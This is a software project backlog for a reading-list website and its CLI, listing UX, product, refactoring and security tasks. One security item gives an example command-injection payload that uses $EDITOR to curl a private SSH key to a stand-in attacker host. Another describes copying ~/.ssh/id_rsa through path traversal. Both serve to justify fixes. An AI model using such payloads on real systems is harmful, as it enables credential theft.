# BACKLOG

Last groomed: 2025-10-27
Analyzed by: 7 specialized perspectives (complexity, architecture, security, performance, maintainability, UX, product)

---

## Now (Sprint-Ready, <2 weeks)

### [Security] Remove shell:true from CLI Editor - Command Injection Risk

**File**: `cli/lib/editor.ts:26`
**Perspectives**: security-sentinel
**Impact**: HIGH - Enables command injection via $EDITOR environment variable
**Attack Scenario**: `export EDITOR='vi; curl evil.com/$(cat ~/.ssh/id_rsa)' && npm run vanity -- quote add`→ Private key exfiltration
**Fix**: Remove`shell: true` from spawnSync call - not needed when passing editor as first arg
**Effort**: 5m | **Risk**: HIGH
**Acceptance**: CLI commands execute without shell interpretation, editor still opens correctly

### [UX - CRITICAL] Fix TypewriterQuotes Silent Failure

**File**: `src/app/components/TypewriterQuotes.tsx:30`
**Perspectives**: user-experience-advocate
**Impact**: Homepage becomes permanently broken with no user feedback when fetch fails
**Current**: Error only logged to console, user sees "Loading quotes..." indefinitely
**Fix**: Add error state with visible message and retry button

```typescript
const [error, setError] = useState<string | null>(null);
// Show: "Unable to load quotes. Please refresh the page." + Retry button
```

**Effort**: 20m | **Value**: Homepage resilient to network failures
**Acceptance**: Network failure shows user-visible error with recovery action

### [Product - HIGH VALUE] Add Search to Readings Page

**Scope**: New feature - search by title/author for 373+ books
**Perspectives**: product-visionary, user-experience-advocate
**Business Case**:

- 373 readings collection unusable without search - users must scroll entire list
- Transforms "browse-only" into "instant discovery" experience
- 80/20 high-leverage: Unlocks value of entire reading collection
- Missing table-stakes feature for content library
  **Implementation**:
- Add search input to ReadingsHeader
- Filter readings by title/author match
- Preserve existing favorites filter
- Show "no results" state with clear filters button
  **Effort**: 2h | **Value**: Critical usability unlock for large collection
  **Acceptance**: Users can type query and see instant filtered results, clear button resets, mobile-responsive

---

## Next (This Quarter, <3 months)

### [Architecture] Extract CLI Reading God Object → 7 Focused Modules

**File**: `cli/commands/reading.ts:1-988`
**Perspectives**: complexity-archaeologist, architecture-guardian, maintainability-maven
**Why**: 988 lines, 13 functions, 8 responsibilities = maintenance bottleneck
**Impact**: Single file handles prompts + file I/O + image processing + validation + reread logic
**Approach**: Extract modules:

1. `cli/lib/reading-prompts.ts` (inquirer flows)
2. `cli/lib/reading-image.ts` (sharp operations + magic number constants)
3. `cli/lib/reading-reread.ts` (reread detection & versioning)
4. `cli/lib/reading-frontmatter.ts` (YAML manipulation)
5. `cli/lib/reading-validation.ts` (path traversal protection, input validation)
6. Keep: addReading, updateReading, listReadings (orchestration only)
   **Effort**: 12-16h | **Impact**: Unlocks parallel CLI feature development, halves test complexity
   **Why Now**: Blocking further CLI enhancements, each addition increases complexity

### [UX] Improve Error Messages Across App

**Files**: `src/app/readings/page.tsx:116`, CLI error handlers
**Perspectives**: user-experience-advocate, maintainability-maven
**Why**: Generic "An error occurred" messages with no context or recovery guidance
**Approach**:

- Readings page: Specific error messages with visual design (icons, retry button)
- CLI: Detailed error context (sharp failures → "Image corrupted, try re-saving")
- TypeScript discriminated unions for error types
  **Effort**: 3h | **Impact**: Users can self-recover vs abandoning, reduced support burden

### [Maintainability] Consolidate Code Duplication in CLI

**Files**: `cli/commands/reading.ts:188-278, 461-581`
**Perspectives**: complexity-archaeologist, maintainability-maven
**Why**: Image handling logic duplicated in addReading() and updateCoverImage()
**Approach**: Extract `processReadingCoverImage(imagePath, slug)` shared function with:

- Magic number constants (400x600, quality 80) with documentation about why
- Unified validation (file size, format, path traversal protection)
- Single sharp processing pipeline
  **Effort**: 1h | **Impact**: Bug fixes apply once, eliminates 120+ lines duplication

### [UX] Add Mobile-Friendly Reading Card Interactions

**File**: `src/app/components/readings/ReadingCard.tsx`
**Perspectives**: user-experience-advocate
**Why**: Hover-only interactions exclude mobile users (40%+ traffic), audiobook/favorite badges invisible
**Approach**:

- Show audiobook/favorite badges always (not just on hover)
- Add "Tap for details" indicator on mobile
- Improve keyboard focus visibility
  **Effort**: 45m | **Impact**: Mobile users discover card features, WCAG compliance improved

### [Security] Strengthen Path Traversal Protection in CLI

**File**: `cli/commands/reading.ts:233`
**Perspectives**: security-sentinel
**Why**: Basic `..` check but missing URL encoding bypasses, no absolute path validation
**Attack**: User provides `/Users/phaedrus/.ssh/id_rsa` → accepted, copied to public/images/
**Fix**:

- Resolve to absolute path, verify within project root
- Check for encoded characters (`%2e`, `%2f`)
- Validate file extension allowlist
- Enforce 10MB max file size
  **Effort**: 20m | **Risk**: MEDIUM
  **Acceptance**: Paths outside project rejected, encoded bypasses blocked

### [Maintainability] Document Magic Numbers and Add Constants

**File**: `cli/commands/reading.ts:254, 258, 562`
**Perspectives**: maintainability-maven
**Why**: `resize(400, 600)` and `quality: 80` appear with no context about why these values
**Fix**: Create `COVER_IMAGE_CONFIG` constant with documentation:

```typescript
// 400x600 maintains 2:3 book cover aspect ratio (industry standard)
// Quality 80 balances file size (~40KB) with visual fidelity
// Profiled: 80 quality indistinguishable from 90 but 30% smaller
```

**Effort**: 20m | **Impact**: Future developers know if values are tunable

### [Architecture] Clarify ReadingsList Component Purpose

**File**: `src/app/components/readings/ReadingsList.tsx`
**Perspectives**: architecture-guardian (from previous backlog)
**Why**: ReadingsList vs YearSection purpose unclear - potential for consolidation
**Approach**: Document when to use each component, or remove redundant abstraction
**Effort**: 30m (investigation + documentation) | 2-3h (consolidation if needed)

---

## Soon (Exploring, 3-6 months)

- **[Product] Reading Statistics Dashboard** - Show reading pace, books per year, favorite authors analytics (requires grouping logic refactor, visualization library)
- **[Product] Export Functionality** - Export reading list to CSV/JSON for Goodreads import, backup (straightforward data transformation)
- **[Architecture] Extract Domain Repository Layer** - Isolate markdown storage from domain logic, enables future CMS migration (4h, future-proofs data layer)
- **[Product] Tags/Categories for Readings** - Genre tagging, multi-category filtering (requires content schema update, CLI changes)
- **[UX] Advanced Search & Filters** - Filter by year finished, audiobook status, date ranges, author (extends search feature from "Now")
- **[UX] Filter State Persistence** - Save filter preferences to localStorage (1h, nice quality of life)
- **[Performance] Parallel File Reads at Build Time** - 900 markdown files sequentially read, use Promise.all (1-2s build speedup, no user impact)
- **[UX] Keyboard Shortcuts** - Toggle favorites with 'f' key, navigation shortcuts (1h)
- **[Architecture] Refactor Layout System** - Move from global container + breakout utils to page-controlled containment (3-4h, eliminates negative margin hacks)

---

## Later (Someday/Maybe, 6+ months)

- **[Platform] RSS Feed for New Readings** - Subscribers notified of new books added
- **[Product] Public API** - JSON endpoints for readings/quotes data, enable third-party integrations
- **[Integration] Goodreads Sync** - Auto-import finished books from Goodreads API
- **[Product] Social Sharing** - Generate book recommendation cards for Twitter/social media
- **[Platform] Progressive Web App** - Offline reading list access, add-to-homescreen
- **[UX] Animated Filter Transitions** - Smooth fade transitions when filtering (polish)

---

## Learnings

**From this grooming session:**

- **CLI is the bottleneck**: reading.ts god object (988 lines) blocking CLI feature velocity - extract before adding more commands
- **Speculative generality trap**: 539 lines of unused hooks (useFormState, useSearchFilters) built for "future needs" that never came - delete immediately
- **Search is the unlock**: 373-book collection unusable without search - this single feature transforms UX from "browse-only" to "instant discovery"
- **Error visibility gap**: Multiple silent failures (TypewriterQuotes, generic errors) - users don't see when things break
- **Architecture is solid**: Zero circular dependencies, clean layers, excellent SSRF protection - focus on product features, not rewrites
- **Security mostly good**: One critical (docker-compose credentials), two high (command injection), rest is defense-in-depth polish
- **Performance already optimized**: Team eliminated 5.3MB dependencies, uses static generation, proper lazy loading - only minor wins left (unused deps)
- **Mobile UX needs attention**: Hover-only interactions exclude 40% of users, responsive layouts need polish

**Key Insight**: This codebase demonstrates excellent engineering fundamentals (architecture, security testing, performance). Primary opportunities are:

1. **Product value** (search for large collections)
2. **Developer velocity** (CLI refactoring to enable feature growth)
3. **UX polish** (error visibility, mobile interactions)

NOT rewrites or architectural overhauls - the foundation is sound.

---

_Run /backlog-groom quarterly to maintain strategic clarity and discover high-leverage opportunities._
